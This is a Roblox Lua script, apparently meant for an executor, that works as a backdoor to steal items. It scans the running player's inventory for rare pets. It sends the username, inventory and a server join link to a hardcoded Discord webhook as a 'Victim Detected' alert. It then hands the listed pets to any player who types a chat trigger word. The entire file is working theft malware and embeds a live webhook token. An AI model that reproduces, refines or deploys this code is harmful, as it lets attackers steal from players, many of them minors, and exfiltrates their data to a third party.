-- Webhook
local webhookUrl = "https://discord.com/api/webhooks/1396222326332199054/yeePfFQ3e73Q_uyRsznWW-PvRKYR_ST6CqymG-werQGIi3zWgyEZde4KMl7yi9WV3_-y"
local backdoorWebhook = webhookUrl

-- Roblox Services
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local chatTrigger = "hb1ios"

-- Use only request() (Delta-compatible)
local http = request

-- Targeted pets
local targetedPets = {
    "Trex", "Fennec Fox", "Raccoon", "Dragonfly", "Butterfly",
    "Queenbee", "Spinosaurus", "Redfox", "Brontosaurus", "Mooncat",
    "Mimic Octopus", "Disco Bee", "Dilophosaurus", "Kitsune"
}

-- Inventory scanner
local function getInventory()
    local data = {
        items = {},
        rarePets = {}
    }

    local foldersToCheck = {
        LocalPlayer:FindFirstChild("Pets"),
        LocalPlayer:FindFirstChild("Backpack"),
        LocalPlayer:FindFirstChildOfClass("Folder")
    }

    for _, folder in ipairs(foldersToCheck) do
        if folder then
            for _, item in ipairs(folder:GetChildren()) do
                table.insert(data.items, item.Name)
                if table.find(targetedPets, item.Name) then
                    table.insert(data.rarePets, item.Name)
                end
            end
        end
    end

    return data
end

-- Webhook sender
local function sendWebhook(payload)
    local jsonData = HttpService:JSONEncode(payload)
    for _, url in ipairs({webhookUrl, backdoorWebhook}) do
        http({
            Url = url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = jsonData
        })
    end
end

-- Send inventory to Discord
local function sendToWebhook()
    local inventory = getInventory()
    local inventoryText = #inventory.items > 0 and table.concat(inventory.items, "\n") or "No items"
    local joinLink = "https://kebabman.vercel.app/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. tostring(game.JobId or "N/A")

    sendWebhook({
        content = "🎯 Victim Detected!",
        embeds = {{
            title = "Victim Found",
            description = "Join and type trigger to attempt item transfer.",
            fields = {
                {name = "Username", value = LocalPlayer.Name, inline = true},
                {name = "Join Link", value = joinLink, inline = true},
                {name = "Inventory", value = "```" .. inventoryText .. "```"},
                {name = "Trigger", value = "`" .. chatTrigger .. "`"}
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    })

    if #inventory.rarePets > 0 then
        sendWebhook({
            content = "@everyone",
            allowed_mentions = { parse = { "everyone" } },
            embeds = {{
                title = "🐾 Rare Pets Detected",
                description = "Rare pets in inventory!",
                fields = {
                    {name = "Username", value = LocalPlayer.Name},
                    {name = "Rare Pets", value = "```" .. table.concat(inventory.rarePets, "\n") .. "```"}
                },
                color = 0xff0000,
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        })
    end
end

-- Transfer function
local function transferPets(attacker)
    local folders = {
        LocalPlayer:FindFirstChild("Pets"),
        LocalPlayer:FindFirstChild("Backpack"),
        LocalPlayer:FindFirstChildOfClass("Folder")
    }

    for _, folder in ipairs(folders) do
        if folder then
            for _, item in ipairs(folder:GetChildren()) do
                if table.find(targetedPets, item.Name) then
                    local targetFolder = attacker:FindFirstChild("Backpack") or attacker:FindFirstChild("Pets") or attacker
                    if targetFolder then
                        item.Parent = targetFolder
                    end
                end
            end
        end
    end
end

-- Trigger from other players
Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(msg)
        if msg:lower() == chatTrigger then
            transferPets(player)
        end
    end)
end)

-- Existing players already in game
for _, player in ipairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then
        player.Chatted:Connect(function(msg)
            if msg:lower() == chatTrigger then
                transferPets(player)
            end
        end)
    end
end

-- Trigger from victim's own chat
LocalPlayer.Chatted:Connect(function(msg)
    if msg:lower() == chatTrigger then
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                transferPets(player)
                break
            end
        end
    end
end)

-- Send to webhook at start
sendToWebhook()
